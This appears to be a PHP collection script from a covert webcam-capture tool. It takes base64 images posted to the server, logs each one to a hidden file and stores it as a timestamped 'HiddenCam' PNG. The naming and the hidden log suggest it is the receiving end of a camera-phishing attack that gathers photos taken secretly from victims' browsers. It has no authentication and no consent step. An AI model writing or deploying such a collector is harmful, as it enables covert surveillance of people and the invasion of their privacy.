<?php

$date = date('i_s_H-dMY');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, ".www/.cam.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( '~/hiddencam/images/HiddenCam-'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>
